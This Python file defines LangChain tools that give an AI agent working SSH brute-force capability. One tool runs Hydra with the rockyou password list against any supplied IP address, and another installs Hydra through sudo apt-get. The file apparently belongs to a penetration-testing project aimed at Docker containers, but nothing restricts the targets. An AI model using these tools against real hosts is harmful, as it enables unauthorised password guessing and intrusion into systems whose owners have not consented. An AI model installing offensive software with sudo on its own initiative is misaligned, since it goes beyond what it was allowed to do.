import subprocess

from langchain_core.tools import tool


@tool
def brute_force_ssh(
    container_ip: str,
    username: str,
    pass_list_path: str = "/root/devguard/backend/devguard/examples/ssh-pentest/rockyou.txt",
    threads: int = 4,
):
    """
    Brute-force SSH login for a Docker container using Hydra.

    Args:
        container_ip (str): The IP address of the container.
        username (str): The username used for ssh.
        pass_list_path (str): Path to the file containing passwords.
        threads (int): Number of parallel connections (default: 4).

    Returns:
        str: Success or error message.
    """

    # Construct the Hydra command
    command = [
        "hydra",
        "-l",
        username,
        "-P",
        pass_list_path,
        container_ip,
        "ssh",
        "-t",
        str(threads),
    ]

    try:
        # Execute the Hydra command
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0:
            # If successful, return the output
            return f"Brute force completed. Output:\n{result.stdout}"
        else:
            # If failed, return the error message
            return f"Failed to brute force. Error: {result.stderr.strip()}"
    except FileNotFoundError as e:
        # Handle the case where Hydra is not installed
        if "hydra" in str(e):
            return "Hydra is required for brute-forcing. Install it using 'sudo apt-get install hydra'."
        return f"Command error: {str(e)}"


@tool
def install_hydra():
    """Installs hydra on a system using apt-get."""
    try:
        # Construct the apt-get install command
        command = ["sudo", "apt-get", "install", "-y", "hydra"]
        # Execute the command
        result = subprocess.run(command, capture_output=True, text=True)

        if result.returncode == 0:
            # If installation is successful
            return "hydra installed successfully."
        else:
            # If installation fails
            return f"Error installing hydra: {result.stderr.strip()}"
    except Exception as e:
        # Handle any unexpected errors
        return f"An unexpected error occurred: {str(e)}"


# List of Hydra-related tools available for use
hydra_tools = [brute_force_ssh, install_hydra]
